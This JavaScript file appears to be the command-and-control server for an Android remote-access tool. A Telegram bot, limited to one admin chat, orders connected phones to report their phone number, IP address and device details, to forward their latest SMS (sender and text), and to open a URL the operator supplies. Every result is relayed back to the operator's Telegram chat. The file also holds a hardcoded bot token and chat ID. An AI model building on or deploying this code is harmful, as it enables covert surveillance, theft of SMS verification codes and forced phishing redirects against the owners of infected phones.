const { Telegraf } = require('telegraf');
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const { v4: uuidv4 } = require('uuid');

// Initialize Express and Socket.IO
const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// Initialize Telegram Bot
const bot = new Telegraf('7883590739:AAEF6vbngZGD8bgMP2mOAmIXIzAgDK2ICe0'); // Replace with your bot token
const adminChatId = '7208236708'; // Replace with your Telegram chat ID

// Store connected clients
const clients = new Map();

// Bot Commands
bot.start((ctx) => {
  ctx.reply('Welcome to Remote Control Bot!', {
    reply_markup: {
      inline_keyboard: [
        [{ text: '📱 Device Info', callback_data: 'device_info' }],
        [{ text: '🔗 Set URL', callback_data: 'set_url' }],
        [{ text: '📩 Last SMS', callback_data: 'last_sms' }],
      ],
    },
  });
});

// Handle Button Clicks
bot.action('device_info', (ctx) => {
  if (ctx.chat.id.toString() !== adminChatId) {
    ctx.reply('Unauthorized!');
    return;
  }
  const clientId = Array.from(clients.keys())[0]; // Assuming one client for simplicity
  if (clientId) {
    clients.get(clientId).emit('get_device_info', { requestId: uuidv4() });
    ctx.reply('Requesting device info...');
  } else {
    ctx.reply('No device connected!');
  }
});

bot.action('set_url', (ctx) => {
  if (ctx.chat.id.toString() !== adminChatId) {
    ctx.reply('Unauthorized!');
    return;
  }
  ctx.reply('Please send the URL to open:');
  bot.on('text', (urlCtx) => {
    if (urlCtx.chat.id.toString() !== adminChatId) return;
    const url = urlCtx.message.text;
    const clientId = Array.from(clients.keys())[0];
    if (clientId) {
      clients.get(clientId).emit('set_url', { url, requestId: uuidv4() });
      urlCtx.reply('URL sent to device!');
    } else {
      urlCtx.reply('No device connected!');
    }
    bot.removeListener('text'); // Remove listener after handling
  });
});

bot.action('last_sms', (ctx) => {
  if (ctx.chat.id.toString() !== adminChatId) {
    ctx.reply('Unauthorized!');
    return;
  }
  const clientId = Array.from(clients.keys())[0];
  if (clientId) {
    clients.get(clientId).emit('get_last_sms', { requestId: uuidv4() });
    ctx.reply('Requesting last SMS...');
  } else {
    ctx.reply('No device connected!');
  }
});

// Socket.IO Connection Handling
io.on('connection', (socket) => {
  console.log('New client connected:', socket.id);
  clients.set(socket.id, socket);

  socket.on('device_info', (data) => {
    bot.telegram.sendMessage(
      adminChatId,
      `📱 *Device Info*\n` +
      `Name: ${data.deviceName}\n` +
      `IP: ${data.ipAddress}\n` +
      `Phone: ${data.phoneNumber}\n` +
      `Model: ${data.model}\n` +
      `Android Version: ${data.androidVersion}`,
      { parse_mode: 'Markdown' }
    );
  });

  socket.on('last_sms', (data) => {
    bot.telegram.sendMessage(
      adminChatId,
      `📩 *Last SMS*\n` +
      `Sender: ${data.sender}\n` +
      `Message: ${data.message}\n` +
      `Time: ${new Date(data.timestamp).toLocaleString()}`,
      { parse_mode: 'Markdown' }
    );
  });

  socket.on('url_opened', (data) => {
    bot.telegram.sendMessage(adminChatId, `🔗 URL opened successfully: ${data.url}`);
  });

  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
    clients.delete(socket.id);
    bot.telegram.sendMessage(adminChatId, '⚠️ Device disconnected!');
  });
});

// Start Server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

// Start Bot
bot.launch();
console.log('Bot is running...');

// Handle graceful shutdown
process.on('SIGINT', () => {
  bot.stop();
  server.close();
  console.log('Server and bot stopped.');
  process.exit(0);
});